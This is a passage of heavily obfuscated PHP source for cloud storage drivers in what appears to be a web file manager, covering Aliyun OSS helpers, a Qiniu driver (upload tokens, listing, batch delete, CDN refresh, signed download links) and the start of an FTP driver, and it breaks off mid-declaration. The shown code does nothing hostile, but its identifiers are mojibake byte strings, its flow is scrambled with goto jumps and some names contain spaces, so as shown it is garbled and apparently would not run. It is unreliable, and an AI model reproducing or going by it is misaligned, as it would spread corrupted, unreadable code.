info($C©Õ©ÅôĞÖ) { if ($this->isFolder($C©Õ©ÅôĞÖ)) { return $this->folderInfo($C©Õ©ÅôĞÖ); } else { if ($this->isFile($C©Õ©ÅôĞÖ)) { return $this->fileInfo($C©Õ©ÅôĞÖ); } } return !1; } public function exist($A¡éÙ³ëÌù) { return $this->isFile($A¡éÙ³ëÌù) || $this->isFolder($A¡éÙ³ëÌù); } public function isFile($C®Â‘Î–¶) { return !$this->isFolder($C®Â‘Î–¶) && $this->objectMeta($C®Â‘Î–¶); } public function isFolder($a·º‰º»ù) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][223], $a·º‰º»ù); } protected function objectMeta($CÖŠ¨Í´Ş) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][224], $CÖŠ¨Í´Ş); } protected function _objectMeta($a•½÷ÈŠ¢À) { $dÊ›Õ÷´¹î =& $_SERVER[ã®Â„Éæ¹¤]; try { $DÙ¢Ãä‡£ê = $this->client->getObjectMeta($this->bucket, $this->pathEncode($a•½÷ÈŠ¢À)); } catch (OSS\Core\OssException $e¯ö„˜’»£) { $DÙ¢Ãä‡£ê = !1; } if ($DÙ¢Ãä‡£ê) { $DÙ¢Ãä‡£ê[$dÊ›Õ÷´¹î[77]] = intval($DÙ¢Ãä‡£ê[$dÊ›Õ÷´¹î[1209]]); } return $DÙ¢Ãä‡£ê; } protected function _isFolder($e…á½Ç‘™ï) { $fŠ½§­òñç =& $_SERVER[ã®Â„Éæ¹¤]; if ($e…á½Ç‘™ï == $fŠ½§­òñç[33] || $e…á½Ç‘™ï == $fŠ½§­òñç[8]) { return !0; } $E‰‡¤µÉ‡ = array($fŠ½§­òñç[1199] => $fŠ½§­òñç[8], $fŠ½§­òñç[186] => rtrim($e…á½Ç‘™ï, $fŠ½§­òñç[8]) . $fŠ½§­òñç[8], $fŠ½§­òñç[1200] => 1, $fŠ½§­òñç[1201] => $fŠ½§­òñç[33]); $Fõ²Ø´İ´Ü = $this->client->listObjects($this->bucket, $E‰‡¤µÉ‡); if ($Fõ²Ø´İ´Ü->getObjectList() || $Fõ²Ø´İ´Ü->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($B­¶”Ö²Û) { parent::__construct(); require_once SDK_DIR . $_SERVER[ã®Â„Éæ¹¤][1230]; $this->_init($B­¶”Ö²Û); } public function _init($EèŒØØ”Äœ) { foreach ($EèŒØØ”Äœ as $Dğè»â¨«ò => $A©–Ü¼ŒÀ®) { if (isset($this->{$Dğè»â¨«ò})) { $this->{$Dğè»â¨«ò} = $A©–Ü¼ŒÀ®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ã®Â„Éæ¹¤][1231], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($A¬ùœè–¨©, $c‚ªÎŸáÖŸ = '', $CÛŸœ’‰ÆÜ = REPEAT_RENAME) { if ($this->setContent($A¬ùœè–¨©, $c‚ªÎŸáÖŸ)) { return $this->getPathOuter($A¬ùœè–¨©); } return !1; } public function mkdir($a–ÊçÛé«‡, $a§›éÈç–™ = REPEAT_SKIP) { goto A¶ÎĞ¦•¢‰; C»õ …»ŸÏ: if (!$this->mkfile($EŸõ§·”îÛ)) { return !1; } if (!$this->moveFile($EŸõ§·”îÛ, $a–ÊçÛé«‡)) { $this->delFile($EŸõ§·”îÛ); return !1; } return $this->getPathOuter($fÓ„ÔŠ‹˜‚); goto fëÎÜÅ‡Ö; A¶ÎĞ¦•¢‰: $f¿ß†¾”ç… =& $_SERVER[ã®Â„Éæ¹¤]; $fÓ„ÔŠ‹˜‚ = trim($a–ÊçÛé«‡, $f¿ß†¾”ç…[8]); if ($this->_isFolder($fÓ„ÔŠ‹˜‚)) { return $this->getPathOuter($fÓ„ÔŠ‹˜‚); } goto D–å¯Øö›ï; D–å¯Øö›ï: $a–ÊçÛé«‡ = $fÓ„ÔŠ‹˜‚ . $f¿ß†¾”ç…[8]; $Bø¯‰«ë›ç = get_path_this($fÓ„ÔŠ‹˜‚); $EŸõ§·”îÛ = $a–ÊçÛé«‡ . $Bø¯‰«ë›ç; goto C»õ …»ŸÏ; fëÎÜÅ‡Ö: } public function copyFile($BÍš¥é°®, $EÜ¤À„Ñï) { $cà¡ëÉáƒÆ = $this->bucketManager->copy($this->bucket, $BÍš¥é°®, $this->bucket, $EÜ¤À„Ñï, !0); return $cà¡ëÉáƒÆ ? !1 : $this->getPathOuter($EÜ¤À„Ñï); } public function moveFile($F¡ƒá¾˜ù¥, $EÛ„†‚íÛÜ) { $AÆ´Ê…„×‰ = $this->bucketManager->move($this->bucket, $F¡ƒá¾˜ù¥, $this->bucket, $EÛ„†‚íÛÜ, !0); return $AÆ´Ê…„×‰ ? !1 : $this->getPathOuter($EÛ„†‚íÛÜ); } public function delFile($f‡è¬§ßŞ) { $eÆ´íêİò = $this->bucketManager->delete($this->bucket, $f‡è¬§ßŞ); return $eÆ´íêİò ? !1 : !0; } public function delFolder($Då²æçŞ¦ù) { $Aß·á›’•Š = $this->fileList($Då²æçŞ¦ù); if (empty($Aß·á›’•Š)) { return !0; } $añÉ‚ë²×¼ = 1000; if (count($Aß·á›’•Š) <= $añÉ‚ë²×¼) { return $this->qnDelObj($Aß·á›’•Š) ? !1 : !0; } foreach (array_chunk($Aß·á›’•Š, $añÉ‚ë²×¼) as $FµÙİÅÜÇ‹) { $F”ºåù¸Å = $this->qnDelObj($FµÙİÅÜÇ‹); if ($F”ºåù¸Å) { return !1; } } return !0; } private function qnDelObj($f¶¤µğÛ’) { $eÌ·©‹’÷Ö = $this->bucketManager->buildBatchDelete($this->bucket, $f¶¤µğÛ’); list($CËµÅ­Çõ‚, $e¿É©µÂ¿Æ) = $this->bucketManager->batch($eÌ·©‹’÷Ö); return $e¿É©µÂ¿Æ; } private function fileList($e¸œŸ¼ø, $Aİ¼í‚ŞÅî = 0) { goto fÉ×»á¬°î; e°“†®Š¤: $Dš²‘›µÓ = array(); while (!0) { list($aÒÈİà²ã, $a——´Æš£Æ) = $this->bucketManager->listFiles($this->bucket, $D‰·è…ìôº, $ağ£ÎßŒÓÜ, $cÀ„Ì×‚ê , $A§»¡¬ğ); if ($a——´Æš£Æ) { return !1; } $ağ£ÎßŒÓÜ = array_key_exists($C„Ÿä¾Ø[1201], $aÒÈİà²ã) ? $ağ£ÎßŒÓÜ = $aÒÈİà²ã[$C„Ÿä¾Ø[1232]] : $C„Ÿä¾Ø[33]; foreach ($aÒÈİà²ã[$C„Ÿä¾Ø[1233]] as $c«ôÒõßÃ) { $bï‘Ç–÷É = $c«ôÒõßÃ[$C„Ÿä¾Ø[89]]; if ($Aİ¼í‚ŞÅî) { $bï‘Ç–÷É = array($C„Ÿä¾Ø[28] => $bï‘Ç–÷É, $C„Ÿä¾Ø[77] => $c«ôÒõßÃ[$C„Ÿä¾Ø[1234]]); } $Dš²‘›µÓ[] = $bï‘Ç–÷É; } if ($ağ£ÎßŒÓÜ == $C„Ÿä¾Ø[33]) { break; } } return $Dš²‘›µÓ; goto f®ŞÀİš•ö; fÉ×»á¬°î: $C„Ÿä¾Ø =& $_SERVER[ã®Â„Éæ¹¤]; $e¸œŸ¼ø = trim($e¸œŸ¼ø, $C„Ÿä¾Ø[8]); $D‰·è…ìôº = empty($e¸œŸ¼ø) ? $C„Ÿä¾Ø[33] : $e¸œŸ¼ø . $C„Ÿä¾Ø[8]; goto bñºÍëò Ë; bñºÍëò Ë: $ağ£ÎßŒÓÜ = $C„Ÿä¾Ø[33]; $cÀ„Ì×‚ê  = 1000; $A§»¡¬ğ = $C„Ÿä¾Ø[33]; goto e°“†®Š¤; f®ŞÀİš•ö: } public function rename($A§Ê¡ïèŠ, $eÔ‡ğ‹÷) { return $this->renameObject($A§Ê¡ïèŠ, $eÔ‡ğ‹÷); } public function fileInfo($CŠ«ÚŞâ£·, $C±øÊÓÍÕÅ = false, $B–ÕËªé“¢ = array()) { goto fôÙ³ÀÖ¼Ç; fôÙ³ÀÖ¼Ç: $bÊîÓ¥ïìÂ =& $_SERVER[ã®Â„Éæ¹¤]; if ($C±øÊÓÍÕÅ) { return array($bÊîÓ¥ïìÂ[28] => $this->pathThis($CŠ«ÚŞâ£·), $bÊîÓ¥ïìÂ[75] => $this->getPathOuter($bÊîÓ¥ïìÂ[8] . $CŠ«ÚŞâ£·), $bÊîÓ¥ïìÂ[29] => $bÊîÓ¥ïìÂ[167], $bÊîÓ¥ïìÂ[77] => isset($B–ÕËªé“¢[$bÊîÓ¥ïìÂ[1234]]) ? $B–ÕËªé“¢[$bÊîÓ¥ïìÂ[1234]] : 0, $bÊîÓ¥ïìÂ[160] => $this->ext($CŠ«ÚŞâ£·)); } $bÉ³™½¨›Ü = array($bÊîÓ¥ïìÂ[28] => $this->pathThis($CŠ«ÚŞâ£·), $bÊîÓ¥ïìÂ[75] => $this->getPathOuter($bÊîÓ¥ïìÂ[8] . $CŠ«ÚŞâ£·), $bÊîÓ¥ïìÂ[29] => $bÊîÓ¥ïìÂ[167], $bÊîÓ¥ïìÂ[187] => 0, $bÊîÓ¥ïìÂ[107] => 0, $bÊîÓ¥ïìÂ[77] => 0, $bÊîÓ¥ïìÂ[160] => $this->ext($CŠ«ÚŞâ£·), $bÊîÓ¥ïìÂ[188] => !0, $bÊîÓ¥ïìÂ[189] => !0); goto Bæ Äí± Å; A«áõ¼ò÷Ô: return $bÉ³™½¨›Ü; goto D·¶Á ’ìŠ; Bæ Äí± Å: if (empty($B–ÕËªé“¢)) { $B–ÕËªé“¢ = $this->objectMeta($CŠ«ÚŞâ£·); if (!$B–ÕËªé“¢) { return $bÉ³™½¨›Ü; } } if (isset($B–ÕËªé“¢[$bÊîÓ¥ïìÂ[1235]])) { $bÉ³™½¨›Ü[$bÊîÓ¥ïìÂ[107]] = substr($B–ÕËªé“¢[$bÊîÓ¥ïìÂ[1235]] . $bÊîÓ¥ïìÂ[33], 0, 10); } if (isset($B–ÕËªé“¢[$bÊîÓ¥ïìÂ[1234]])) { $bÉ³™½¨›Ü[$bÊîÓ¥ïìÂ[77]] = $B–ÕËªé“¢[$bÊîÓ¥ïìÂ[1234]]; } goto A«áõ¼ò÷Ô; D·¶Á ’ìŠ: } public function folderInfo($B“ëÂ‡°Ñ, $bˆ—Ù¤ùŠğ = false) { goto e¶Î‰°œÏ‘; e„«äØ©“«: $B“ëÂ‡°Ñ = rtrim($B“ëÂ‡°Ñ, $aˆ…î¸‹Éõ[8]) . $aˆ…î¸‹Éõ[8]; $dÄäÊÑ‚«© = $this->objectMeta($B“ëÂ‡°Ñ); if (isset($dÄäÊÑ‚«©[$aˆ…î¸‹Éõ[1235]])) { $F´‚«¿‹Ó[$aˆ…î¸‹Éõ[107]] = substr($dÄäÊÑ‚«©[$aˆ…î¸‹Éõ[1235]] . $aˆ…î¸‹Éõ[33], 0, 10); } goto aŞÃÄóªÇ; aŞÃÄóªÇ: return $F´‚«¿‹Ó; goto EÄï§–‹¨ˆ; e¶Î‰°œÏ‘: $aˆ…î¸‹Éõ =& $_SERVER[ã®Â„Éæ¹¤]; if ($bˆ—Ù¤ùŠğ) { return array($aˆ…î¸‹Éõ[28] => $this->pathThis($B“ëÂ‡°Ñ), $aˆ…î¸‹Éõ[75] => $this->getPathOuter($aˆ…î¸‹Éõ[8] . $B“ëÂ‡°Ñ), $aˆ…î¸‹Éõ[29] => $aˆ…î¸‹Éõ[76]); } $F´‚«¿‹Ó = array($aˆ…î¸‹Éõ[28] => $this->pathThis($B“ëÂ‡°Ñ), $aˆ…î¸‹Éõ[75] => $this->getPathOuter($aˆ…î¸‹Éõ[8] . $B“ëÂ‡°Ñ), $aˆ…î¸‹Éõ[29] => $aˆ…î¸‹Éõ[76], $aˆ…î¸‹Éõ[187] => 0, $aˆ…î¸‹Éõ[107] => 0, $aˆ…î¸‹Éõ[1181] => !0, $aˆ…î¸‹Éõ[1182] => !0); goto e„«äØ©“«; EÄï§–‹¨ˆ: } public function listPath($B‡†ÕÖ‚ø, $EÇÙˆˆ°ó = false) { goto eØº™—Úˆ¼; Eô›…¨ÒŞä: $cˆ«ÅÛÂÀä = $f¬İ¯ô…•Å = array(); while (!0) { list($fÛ¨ÎÀÁ÷, $FàÒÑÀÓ‰) = $this->bucketManager->listFiles($this->bucket, $E”ÂÏ«ä”, $C· õÎŒø, $f‹ÛÖ¿øšİ, $dÑ¸®œ÷·Ë); if ($FàÒÑÀÓ‰) { return !1; } $C· õÎŒø = array_key_exists($AÖÚ…è‡Ï™[1201], $fÛ¨ÎÀÁ÷) ? $C· õÎŒø = $fÛ¨ÎÀÁ÷[$AÖÚ…è‡Ï™[1232]] : $AÖÚ…è‡Ï™[33]; if (isset($fÛ¨ÎÀÁ÷[$AÖÚ…è‡Ï™[1236]])) { foreach ($fÛ¨ÎÀÁ÷[$AÖÚ…è‡Ï™[1236]] as $c˜î×Ó¹Ğ®) { if ($c˜î×Ó¹Ğ® == $E”ÂÏ«ä”) { continue; } $cˆ«ÅÛÂÀä[] = $this->folderInfo($c˜î×Ó¹Ğ®, $EÇÙˆˆ°ó); } } if (isset($fÛ¨ÎÀÁ÷[$AÖÚ…è‡Ï™[1233]])) { foreach ($fÛ¨ÎÀÁ÷[$AÖÚ…è‡Ï™[1233]] as $A‘‰‹¶­Åç) { if ($A‘‰‹¶­Åç[$AÖÚ…è‡Ï™[89]] == $E”ÂÏ«ä”) { continue; } $f¬İ¯ô…•Å[] = $this->fileInfo($A‘‰‹¶­Åç[$AÖÚ…è‡Ï™[89]], $EÇÙˆˆ°ó, $A‘‰‹¶­Åç); } } if ($C· õÎŒø == $AÖÚ…è‡Ï™[33]) { break; } } return array($AÖÚ…è‡Ï™[74] => $cˆ«ÅÛÂÀä, $AÖÚ…è‡Ï™[73] => $f¬İ¯ô…•Å); goto cøôÊ’ÊäŠ; c¾ÜÇš…¡Ç: $C· õÎŒø = $AÖÚ…è‡Ï™[33]; $f‹ÛÖ¿øšİ = 1000; $dÑ¸®œ÷·Ë = $AÖÚ…è‡Ï™[8]; goto Eô›…¨ÒŞä; eØº™—Úˆ¼: $AÖÚ…è‡Ï™ =& $_SERVER[ã®Â„Éæ¹¤]; $B‡†ÕÖ‚ø = trim($B‡†ÕÖ‚ø, $AÖÚ…è‡Ï™[8]); $E”ÂÏ«ä” = empty($B‡†ÕÖ‚ø) ? $AÖÚ…è‡Ï™[33] : $B‡†ÕÖ‚ø . $AÖÚ…è‡Ï™[8]; goto c¾ÜÇš…¡Ç; cøôÊ’ÊäŠ: } public function has($E–ÀÊİÊ‚É, $aÖ£ËŒ„¢ğ = false, $DÖù·Éäª = true) { goto A‰×ÈÈ¿Æá; AÅ´Ÿººİ™: $CÕâŠñ¾Ï = $Eö¡£äôñƒ[33]; $fÄ«é¾¶¹Ó = 1000; $DöÇ¦ÇáóÅ = $Eö¡£äôñƒ[8]; goto e…ÄÑŞí; eŒ®î‡Ç›Ò: if ($aÖ£ËŒ„¢ğ) { return array($Eö¡£äôñƒ[191] => $aæğ‰ŞÄ˜§, $Eö¡£äôñƒ[192] => $a¢©àƒ§); } return !1; goto fçóÃ¬‘¯Å; e…ÄÑŞí: $aæğ‰ŞÄ˜§ = 0; $a¢©àƒ§ = 0; while (!0) { list($Fëùêæï•ª, $dƒ‰±—Ï—¼) = $this->bucketManager->listFiles($this->bucket, $a› ó‹¼¤Œ, $CÕâŠñ¾Ï, $fÄ«é¾¶¹Ó, $DöÇ¦ÇáóÅ); if ($dƒ‰±—Ï—¼) { return !1; } $CÕâŠñ¾Ï = array_key_exists($Eö¡£äôñƒ[1201], $Fëùêæï•ª) ? $CÕâŠñ¾Ï = $Fëùêæï•ª[$Eö¡£äôñƒ[1232]] : $Eö¡£äôñƒ[33]; if ($aÖ£ËŒ„¢ğ) { if (!empty($Fëùêæï•ª[$Eö¡£äôñƒ[1233]])) { $aæğ‰ŞÄ˜§ += count($Fëùêæï•ª[$Eö¡£äôñƒ[1233]]); } if (!empty($Fëùêæï•ª[$Eö¡£äôñƒ[1236]])) { $a¢©àƒ§ += count($Fëùêæï•ª[$Eö¡£äôñƒ[1236]]); } if ($CÕâŠñ¾Ï === $Eö¡£äôñƒ[33]) { break; } continue; } if ($DÖù·Éäª) { if (!empty($Fëùêæï•ª[$Eö¡£äôñƒ[1233]])) { return !0; } } else { if (!empty($Fëùêæï•ª[$Eö¡£äôñƒ[1236]])) { return !0; } } if ($CÕâŠñ¾Ï == $Eö¡£äôñƒ[33]) { break; } } goto eŒ®î‡Ç›Ò; A‰×ÈÈ¿Æá: $Eö¡£äôñƒ =& $_SERVER[ã®Â„Éæ¹¤]; $E–ÀÊİÊ‚É = trim($E–ÀÊİÊ‚É, $Eö¡£äôñƒ[8]); $a› ó‹¼¤Œ = empty($E–ÀÊİÊ‚É) ? $Eö¡£äôñƒ[33] : $E–ÀÊİÊ‚É . $Eö¡£äôñƒ[8]; goto AÅ´Ÿººİ™; fçóÃ¬‘¯Å: } public function listAll($bØ£Å§¾Ş) { $AôÍ…Åø¥ =& $_SERVER[ã®Â„Éæ¹¤]; $F…ñŠ²¹»à = $this->fileList($bØ£Å§¾Ş, 1); $aªËğœ’Ÿæ = array(); foreach ($F…ñŠ²¹»à as $B«Ë‚ÚÙä‚) { $aªËğœ’Ÿæ[$B«Ë‚ÚÙä‚[$AôÍ…Åø¥[28]]] = $B«Ë‚ÚÙä‚[$AôÍ…Åø¥[77]]; } return $this->listAllFiles($bØ£Å§¾Ş, array_keys($aªËğœ’Ÿæ), $aªËğœ’Ÿæ); } public function canRead($Dñ³‡‹î¶ã) { return $this->exist($Dñ³‡‹î¶ã) ? !0 : !1; } public function canWrite($E‡Âìˆ­½ö) { return $this->exist($E‡Âìˆ­½ö) ? !0 : !1; } public function getContent($d„×î¢‡ÔÆ) { return $this->fileSubstr($d„×î¢‡ÔÆ, 0, -1); } public function setContent($a‘šéÁîÛ‘, $A‘•×õİÛ = '') { $bŠØ÷ªËßè = $this->tempFile($this->pathThis($a‘šéÁîÛ‘)); file_put_contents($bŠØ÷ªËßè, $A‘•×õİÛ); if ($this->upload($a‘šéÁîÛ‘, $bŠØ÷ªËßè)) { $this->tempFileRemve($bŠØ÷ªËßè); return !0; } return !1; } public function refreshUrls($cäÈ‘Ú¥‚) { goto bğ„×‘‹ï; e¿”Œ¨µÔ›: $cæÉ”à”î´ = new Qiniu\Cdn\CdnManager($this->auth); list($aï×óÏÊİ, $C­‚»ä³¤ã) = $cæÉ”à”î´->refreshUrls($Aš¬§ŞÄ‰); if ($C­‚»ä³¤ã) { return !1; } goto fŒ…®Ñ˜ˆ›; fŒ…®Ñ˜ˆ›: return $aï×óÏÊİ[$fØ•å‡†[1237]] == $fØ•å‡†[718] ? !0 : !1; goto A‚¤´Ù£»Ô; bğ„×‘‹ï: $fØ•å‡† =& $_SERVER[ã®Â„Éæ¹¤]; $Aš¬§ŞÄ‰ = array(); if (is_array($cäÈ‘Ú¥‚)) { foreach ($cäÈ‘Ú¥‚ as $dÈšÉéìÊ) { $Aš¬§ŞÄ‰[] = $this->link($dÈšÉéìÊ); } } else { $Aš¬§ŞÄ‰[] = $this->link($cäÈ‘Ú¥‚); } goto e¿”Œ¨µÔ›; A‚¤´Ù£»Ô: } public function fileSubstr($C–äœº²–Ì, $Eß…¤ŸØªš, $BÍÌÌò£Á) { $a†¾“ëö” =& $_SERVER[ã®Â„Éæ¹¤]; if (!($Eèã¡«Ïë³ = $this->link($C–äœº²–Ì))) { return !1; } $dÔ¦Óî‡²¦ = !1; if ($BÍÌÌò£Á > 0) { $B÷ƒËğĞƒ = $Eß…¤ŸØªš + $BÍÌÌò£Á - 1; $dÔ¦Óî‡²¦ = array($a†¾“ëö”[1238] . $Eß…¤ŸØªš . $a†¾“ëö”[412] . $B÷ƒËğĞƒ); } $cóëœÊ¬µ¦ = url_request($Eèã¡«Ïë³, $a†¾“ëö”[216], !1, $dÔ¦Óî‡²¦); return $cóëœÊ¬µ¦[$a†¾“ëö”[711]] ? $cóëœÊ¬µ¦[$a†¾“ëö”[1053]] : !1; } public function upload($aİ·ëìè½·, $f¹È¤ã—èÖ, $a‹‘ùØó²Ö = false, $BĞÔ‰×‘­å = REPEAT_REPLACE) { $BÍ¹×ÏÖô™ = new Qiniu\Storage\UploadManager(); $e±Š…Æ¶–œ = $this->auth->uploadToken($this->bucket, $aİ·ëìè½·); $Aë¦¶±†ÊÌ = get_file_mime(get_path_ext($f¹È¤ã—èÖ)); list($fõÔ¿¢Ù×, $B¶¨ê¤Â‰) = $BÍ¹×ÏÖô™->putFile($e±Š…Æ¶–œ, $aİ·ëìè½·, $f¹È¤ã—èÖ, null, $Aë¦¶±†ÊÌ); return $B¶¨ê¤Â‰ ? !1 : $this->getPathOuter($aİ·ëìè½·); } public function uploadFormData($dŠí³¤… Ï, $FŸ‚ÑòŠËé = 3600) { return $this->uploadToken($dŠí³¤… Ï, $FŸ‚ÑòŠËé); } public function multiUploadFormData($D…å‰…ƒŠ, $b¾©ìÉ´Éš = 3600) { return $this->uploadToken($D…å‰…ƒŠ, $b¾©ìÉ´Éš); } private function uploadToken($CÑ…İõƒ¶¾, $fâªññîŒ = 3600) { goto d„ßÇ©ÓÃ; fËË÷¿ƒÛÕ: $dĞÅ‚ø—ùí = $CÑ…İõƒ¶¾; $D”£–Ê»ÚÁ = $this->auth->uploadToken($this->bucket, $dĞÅ‚ø—ùí, $A½ÀÃ¼Ù‘ò, $Eğ²„äóÍÁ, !0); $fïê‚³ÖÇÍ = empty($this->region) || $this->region == $eù‚Ã‰ÑÅ¤[1241] ? $eù‚Ã‰ÑÅ¤[33] : $eù‚Ã‰ÑÅ¤[412] . $this->region; goto B¨š°ÙŒ¢Ù; d„ßÇ©ÓÃ: $eù‚Ã‰ÑÅ¤ =& $_SERVER[ã®Â„Éæ¹¤]; $A½ÀÃ¼Ù‘ò = $fâªññîŒ; $Eğ²„äóÍÁ = array($eù‚Ã‰ÑÅ¤[1239] => $eù‚Ã‰ÑÅ¤[1240]); goto fËË÷¿ƒÛÕ; B¨š°ÙŒ¢Ù: $Bç¯Î‚÷¨Ò = http_type() . "\72\57\x2f\165\x70\154\157\x61\144{$fïê‚³ÖÇÍ}\x2e\x71\x69\x6e\151\x75\x70\x2e\143\x6f\155\x2f"; return array($eù‚Ã‰ÑÅ¤[1242] => $D”£–Ê»ÚÁ, $eù‚Ã‰ÑÅ¤[1243] => $Bç¯Î‚÷¨Ò); goto AÖµí‚’Á; AÖµí‚’Á: } public function download($Fì‚ñÓÎÈ, $a‹Ç¬×ÆîÎ) { goto c…´‘÷Ë‹‡; dÏìØ»¶Öê: $C¸ôÃŒµœ‰ = 1024 * 200; $e‹èß–Ù§¶ = fopen($aë¶Ï¸Öš·, $_SERVER[ã®Â„Éæ¹¤][1244]); while (!0) { $b¥õ‰·Õ™ = $this->fileSubstr($Fì‚ñÓÎÈ, $Dà‰‰ÛÆãÂ, $C¸ôÃŒµœ‰); if ($b¥õ‰·Õ™ === !1) { return !1; } fwrite($e‹èß–Ù§¶, $b¥õ‰·Õ™); $Dà‰‰ÛÆãÂ += $C¸ôÃŒµœ‰; if (strlen($b¥õ‰·Õ™) < $C¸ôÃŒµœ‰) { break; } } goto C¬Òé‘­ÅÜ; c…´‘÷Ë‹‡: $aë¶Ï¸Öš· = IO::getPathInner(IO::mkfile($a‹Ç¬×ÆîÎ)); if (!($b±¼º²¿®ó = $this->link($Fì‚ñÓÎÈ))) { return !1; } $Dà‰‰ÛÆãÂ = 0; goto dÏìØ»¶Öê; C¬Òé‘­ÅÜ: fclose($e‹èß–Ù§¶); return $a‹Ç¬×ÆîÎ; goto EêÌ‹ÀÑ÷Ï; EêÌ‹ÀÑ÷Ï: } public function link($b‡˜Ì¤„‘¹, $fŒ´…õ“ÍÆ = '') { if (!$this->isFile($b‡˜Ì¤„‘¹)) { return !1; } $A÷¿Ô“ÈÍø = $this->getHost() . $_SERVER[ã®Â„Éæ¹¤][8] . $this->pathEncode($b‡˜Ì¤„‘¹) . $fŒ´…õ“ÍÆ; return $this->auth->privateDownloadUrl($A÷¿Ô“ÈÍø, 3600 * 12); } public function fileOut($d„§Ã¤«ä½, $B´ñ—§ß± = false, $fè–à¢Š°÷ = false, $EçÑËÉ¿™¿ = '') { $aæ‰ê· Ú½ =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($d„§Ã¤«ä½, $B´ñ—§ß±, $fè–à¢Š°÷, $EçÑËÉ¿™¿); } if (!$fè–à¢Š°÷) { $fè–à¢Š°÷ = $this->pathThis($d„§Ã¤«ä½); } $c¸®Ãœá»È = $B´ñ—§ß± ? $aæ‰ê· Ú½[1245] . rawurlencode($fè–à¢Š°÷) : $aæ‰ê· Ú½[33]; $d°¼‹Òº§ = $this->link($d„§Ã¤«ä½, $c¸®Ãœá»È); $this->fileOutLink($d°¼‹Òº§); } public function fileOutServer($B±«´ˆĞ¨, $Côš¹¾‡×‰ = false, $eÂåÛÌ…ßä = false, $F¬µÑÆŒâ = '') { parent::fileOut($B±«´ˆĞ¨, $Côš¹¾‡×‰, $eÂåÛÌ…ßä, $F¬µÑÆŒâ); } public function fileOutImage($Bˆê™’‡³ˆ, $EÙğ«“Ë¡ = 250) { $eË¾‹Ğïº = $this->link($Bˆê™’‡³ˆ, $_SERVER[ã®Â„Éæ¹¤][1246] . $EÙğ«“Ë¡); $this->fileOutLink($eË¾‹Ğïº); } public function fileOutImageServer($BÍ’Ó“†¥­, $a¿¥ŠäŒ î = 250) { parent::fileOutImage($BÍ’Ó“†¥­, $a¿¥ŠäŒ î); } public function hashMd5($dâŒç¸ö) { $C—§ùÜºí =& $_SERVER[ã®Â„Éæ¹¤]; $dÚÏšè™„‰ = $this->objectMeta($dâŒç¸ö); return isset($dÚÏšè™„‰[$C—§ùÜºí[196]]) ? $dÚÏšè™„‰[$C—§ùÜºí[196]] : !1; $e¸á¥Ûö– = $this->link($dâŒç¸ö, $C—§ùÜºí[1247]); } public function size($C¤¡¾ÒÂ×œ) { $cµ©¹ªšÁõ = $this->objectMeta($C¤¡¾ÒÂ×œ); return $cµ©¹ªšÁõ ? $cµ©¹ªšÁõ[$_SERVER[ã®Â„Éæ¹¤][77]] : 0; } public function info($eõŞÂ©é¶) { if ($this->isFolder($eõŞÂ©é¶)) { return $this->folderInfo($eõŞÂ©é¶); } else { if ($this->isFile($eõŞÂ©é¶)) { return $this->fileInfo($eõŞÂ©é¶); } } return !1; } public function exist($dÏ‚šËĞì©) { return $this->isFile($dÏ‚šËĞì©) || $this->isFolder($dÏ‚šËĞì©); } public function isFile($D÷²‚ÂÔË) { return !$this->isFolder($D÷²‚ÂÔË) && $this->objectMeta($D÷²‚ÂÔË); } public function isFolder($c»éôêô ¨) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][223], $c»éôêô ¨); } protected function objectMeta($aºº’™¬Š¶) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][224], $aºº’™¬Š¶); } protected function _objectMeta($cÒÕ…‹ò¬) { $e´íÖˆÓç =& $_SERVER[ã®Â„Éæ¹¤]; list($eö¨•­¯İ, $AŠ—Ë—¸«) = $this->bucketManager->stat($this->bucket, $cÒÕ…‹ò¬); if ($eö¨•­¯İ) { $eö¨•­¯İ[$e´íÖˆÓç[77]] = intval($eö¨•­¯İ[$e´íÖˆÓç[1234]]); } return $eö¨•­¯İ; } protected function _isFolder($A¥•É˜í¯) { $aÓó¬÷‹ =& $_SERVER[ã®Â„Éæ¹¤]; if ($A¥•É˜í¯ == $aÓó¬÷‹[33] || $A¥•É˜í¯ == $aÓó¬÷‹[8]) { return !0; } list($e÷ÉøÙÀ¾ò, $AÙàĞã¢Ÿ) = $this->bucketManager->listFiles($this->bucket, trim($A¥•É˜í¯, $aÓó¬÷‹[8]) . $aÓó¬÷‹[8], $aÓó¬÷‹[33], 1, $aÓó¬÷‹[8]); return !empty($e÷ÉøÙÀ¾ò[$aÓó¬÷‹[1233]]) || !empty($e÷ÉøÙÀ¾ò[$aÓó¬÷‹[1236]]) ? !0 : !1; } } goto Eè×²‡£ªß; B›©ÆÎ÷ù: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($a–Ú˜×ÑÙ) { parent::__construct(); if (count($a–Ú˜×ÑÙ) > 0) { $this->_init($a–Ú˜×ÑÙ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Eš²ƒàË™™) { $Eá¨Ö²‚ =& $_SERVER[ã®Â„Éæ¹¤]; global $config; $this->appCharset = $config[$Eá¨Ö²‚[1171]]; $this->systemCharset = $config[$Eá¨Ö²‚[1172]]; if (isset($Eš²ƒàË™™[$Eá¨Ö²‚[1173]]) && $Eš²ƒàË™™[$Eá¨Ö²‚[1173]]) { $this->systemCharset = $Eš²ƒàË™™[$Eá¨Ö²‚[1173]]; } } public function iconvApp($aÖ‘÷ÃÇÌ«) { return $this->iconvTo($aÖ‘÷ÃÇÌ«, $this->systemCharset, $this->appCharset); } public function 